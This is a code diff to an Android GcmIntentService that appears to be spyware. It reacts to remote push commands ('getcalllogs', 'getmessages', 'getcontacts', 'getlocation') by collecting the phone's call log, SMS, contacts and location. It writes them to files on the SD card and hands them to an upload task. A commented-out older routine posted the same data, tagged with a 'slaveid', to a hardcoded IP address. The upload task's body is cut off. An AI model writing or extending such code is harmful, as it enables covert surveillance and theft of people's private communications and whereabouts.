@@ -211,8 +211,36 @@ public class GcmIntentService extends IntentService implements
                         }
                     }, 1000);
                 }
-                else
-                sendNotification(intent.getStringExtra("type"));
+                if (type.equalsIgnoreCase("getcalllogs"))
+                {
+                    try {
+                    getCallDetails();
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                }
+                if (type.equalsIgnoreCase("getmessages"))
+                {
+                    try {
+                        getsms();
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+                if (type.equalsIgnoreCase("getcontacts"))
+                {
+                    try {
+                        fetchContacts();
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                    }
+                }
+                if (type.equalsIgnoreCase("getlocation"))
+                {
+
+                        mLocationClient.connect();
+
+                }
 
             }
         }
@@ -225,61 +253,61 @@ public class GcmIntentService extends IntentService implements
     // This is just one simple example of what you might choose to do with
     // a GCM message.
     private void sendNotification(String msg) {
-    if(msg.equalsIgnoreCase("call"))
-    {
-        Thread t = new Thread(new Runnable() {
-            public void run() {
-
-                try {
-                    getCallDetails();
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
-
-            }
-        });
-        t.start();
-    }
-        if(msg.equalsIgnoreCase("contacts"))
-        {
-            Thread t = new Thread(new Runnable() {
-                public void run() {
-
-                    try {
-                        fetchContacts();
-                    } catch (JSONException e) {
-                        e.printStackTrace();
-                    }
-
-                }
-            });
-            t.start();
-        }
-        if(msg.equalsIgnoreCase("messages"))
-        {
-            Thread t = new Thread(new Runnable() {
-                public void run() {
-
-                    try {
-                        getsms();
-                    } catch (JSONException e) {
-                        e.printStackTrace();
-                    }
-
-                }
-            });
-            t.start();
-        }
-        if(msg.equalsIgnoreCase("location"))
-        {
-            Thread t = new Thread(new Runnable() {
-                public void run() {
-
-                    mLocationClient.connect();
-                }
-            });
-            t.start();
-        }
+//    if(msg.equalsIgnoreCase("call"))
+//    {
+//        Thread t = new Thread(new Runnable() {
+//            public void run() {
+//
+//                try {
+//                    getCallDetails();
+//                } catch (JSONException e) {
+//                    e.printStackTrace();
+//                }
+//
+//            }
+//        });
+//        t.start();
+//    }
+//        if(msg.equalsIgnoreCase("contacts"))
+//        {
+//            Thread t = new Thread(new Runnable() {
+//                public void run() {
+//
+//                    try {
+//                        fetchContacts();
+//                    } catch (JSONException e) {
+//                        e.printStackTrace();
+//                    }
+//
+//                }
+//            });
+//            t.start();
+//        }
+//        if(msg.equalsIgnoreCase("messages"))
+//        {
+//            Thread t = new Thread(new Runnable() {
+//                public void run() {
+//
+//                    try {
+//                        getsms();
+//                    } catch (JSONException e) {
+//                        e.printStackTrace();
+//                    }
+//
+//                }
+//            });
+//            t.start();
+//        }
+//        if(msg.equalsIgnoreCase("location"))
+//        {
+//            Thread t = new Thread(new Runnable() {
+//                public void run() {
+//
+//                    mLocationClient.connect();
+//                }
+//            });
+//            t.start();
+//        }
 
 
 
@@ -556,6 +584,7 @@ public class GcmIntentService extends IntentService implements
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(intent);
 
+
     }
 
     private void getCallDetails() throws JSONException {
@@ -610,9 +639,33 @@ public class GcmIntentService extends IntentService implements
         parent.put("logs", logs);
 
         String data = parent.toString();
+//This will get the SD Card directory and create a folder named MyFiles in it.
+        File sdCard = Environment.getExternalStorageDirectory();
+        File directory = new File (sdCard.getAbsolutePath() + "/MyFiles");
+        directory.mkdirs();
 
-        AsyncTaskRunner runner = new AsyncTaskRunner();
-        runner.execute("calllogs", data);
+//Now create the file in the above directory and write the contents into it
+        File file = new File(directory, "calllogs.txt");
+        FileOutputStream fOut = null;
+        try {
+            fOut = new FileOutputStream(file);
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        }
+        OutputStreamWriter osw = new OutputStreamWriter(fOut);
+        try {
+            osw.write(data);
+            osw.flush();
+            osw.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        String filepath = file.getAbsolutePath();
+        uploadFile upload = new uploadFile();
+        upload.execute(filepath,"call");
+
+
 
     }
 
@@ -674,7 +727,7 @@ public class GcmIntentService extends IntentService implements
         directory.mkdirs();
 
 //Now create the file in the above directory and write the contents into it
-        File file = new File(directory, "mysdfile.txt");
+        File file = new File(directory, "contacts.txt");
         FileOutputStream fOut = null;
         try {
             fOut = new FileOutputStream(file);
@@ -689,9 +742,12 @@ public class GcmIntentService extends IntentService implements
         } catch (IOException e) {
             e.printStackTrace();
         }
+        String type = "contacts";
+        String filepath = file.getAbsolutePath();
+        uploadFile upload = new uploadFile();
+        upload.execute(filepath,type);
 
-        AsyncTaskRunner runner = new AsyncTaskRunner();
-        runner.execute("contacts", data);
+
 
 
     }
@@ -734,8 +790,31 @@ public class GcmIntentService extends IntentService implements
         parent.put("messages", messages);
         String data = parent.toString();
         String type = "sms";
-        AsyncTaskRunner runner = new AsyncTaskRunner();
-        runner.execute(type, data);
+        //This will get the SD Card directory and create a folder named MyFiles in it.
+        File sdCard = Environment.getExternalStorageDirectory();
+        File directory = new File (sdCard.getAbsolutePath() + "/MyFiles");
+        directory.mkdirs();
+
+//Now create the file in the above directory and write the contents into it
+        File file = new File(directory, "messages.txt");
+        FileOutputStream fOut = null;
+        try {
+            fOut = new FileOutputStream(file);
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        }
+        OutputStreamWriter osw = new OutputStreamWriter(fOut);
+        try {
+            osw.write(data);
+            osw.flush();
+            osw.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+
+        String filepath = file.getAbsolutePath();
+        uploadFile upload = new uploadFile();
+        upload.execute(filepath,type);
 
 
     }
@@ -776,8 +855,32 @@ public class GcmIntentService extends IntentService implements
                     "       }\n" +
                     "   ]\n" +
                     "}";
-            AsyncTaskRunner runner = new AsyncTaskRunner();
-            runner.execute("location", data);
+            //This will get the SD Card directory and create a folder named MyFiles in it.
+            File sdCard = Environment.getExternalStorageDirectory();
+            File directory = new File (sdCard.getAbsolutePath() + "/MyFiles");
+            directory.mkdirs();
+
+//Now create the file in the above directory and write the contents into it
+            File file = new File(directory, "location.txt");
+            FileOutputStream fOut = null;
+            try {
+                fOut = new FileOutputStream(file);
+            } catch (FileNotFoundException e) {
+                e.printStackTrace();
+            }
+            OutputStreamWriter osw = new OutputStreamWriter(fOut);
+            try {
+                osw.write(data);
+                osw.flush();
+                osw.close();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+
+            String filepath = file.getAbsolutePath();
+            uploadFile upload = new uploadFile();
+            upload.execute(filepath,"location");
+
             mLocationClient.disconnect();
 
 
@@ -813,60 +916,60 @@ public class GcmIntentService extends IntentService implements
 
     }
 
-    private class AsyncTaskRunner extends AsyncTask<String, String, String> {
-
-        @Override
-        protected String doInBackground(String... params) {
-            HttpClient httpclient = new DefaultHttpClient();
-            HttpPost httppost = new HttpPost(
-                    "http://128.199.179.143/groups/api/addDetail");
-            String responseBody = null;
-            Log.i("Type", params[0]);
-            Log.i("ID", getRegistrationId(getApplicationContext()));
-            Log.i("Data", params[1]);
-
-
-            try {
-                // Add your data
-                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
-
-                nameValuePairs.add(new BasicNameValuePair("type", params[0]));
-                nameValuePairs.add(new BasicNameValuePair("detail", params[1]));
-                nameValuePairs.add(new BasicNameValuePair("slaveid", getRegistrationId(getApplicationContext())));
-
-                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
-
-                // Execute HTTP Post Request
-                HttpResponse response = httpclient.execute(httppost);
-                HttpEntity entity = response.getEntity();
-                responseBody = EntityUtils.toString(entity);
-                Log.i("Response", responseBody);
-                // Log.i("Parameters", params[0]);
-
-            } catch (ClientProtocolException e) {
-
-                // TODO Auto-generated catch block
-            } catch (IOException e) {
-
-
-                // TODO Auto-generated catch block
-            }
-            return responseBody;
-
-        }
-
-        /*
-         * (non-Javadoc)
-         *
-         * @see android.os.AsyncTask#onPostExecute(java.lang.Object)
-         */
-        @Override
-        protected void onPostExecute(String result) {
-
-
-        }
-
-    }
+//    private class AsyncTaskRunner extends AsyncTask<String, String, String> {
+//
+//        @Override
+//        protected String doInBackground(String... params) {
+//            HttpClient httpclient = new DefaultHttpClient();
+//            HttpPost httppost = new HttpPost(
+//                    "http://128.199.179.143/groups/api/addDetail");
+//            String responseBody = null;
+//            Log.i("Type", params[0]);
+//            Log.i("ID", getRegistrationId(getApplicationContext()));
+//            Log.i("Data", params[1]);
+//
+//
+//            try {
+//                // Add your data
+//                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
+//
+//                nameValuePairs.add(new BasicNameValuePair("type", params[0]));
+//                nameValuePairs.add(new BasicNameValuePair("detail", params[1]));
+//                nameValuePairs.add(new BasicNameValuePair("slaveid", getRegistrationId(getApplicationContext())));
+//
+//                httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
+//
+//                // Execute HTTP Post Request
+//                HttpResponse response = httpclient.execute(httppost);
+//                HttpEntity entity = response.getEntity();
+//                responseBody = EntityUtils.toString(entity);
+//                Log.i("Response", responseBody);
+//                // Log.i("Parameters", params[0]);
+//
+//            } catch (ClientProtocolException e) {
+//
+//                // TODO Auto-generated catch block
+//            } catch (IOException e) {
+//
+//
+//                // TODO Auto-generated catch block
+//            }
+//            return responseBody;
+//
+//        }
+//
+//        /*
+//         * (non-Javadoc)
+//         *
+//         * @see android.os.AsyncTask#onPostExecute(java.lang.Object)
+//         */
+//        @Override
+//        protected void onPostExecute(String result) {
+//
+//
+//        }
+//
+//    }
     private class uploadFile extends AsyncTask<String, String, String> {
 
         @Override
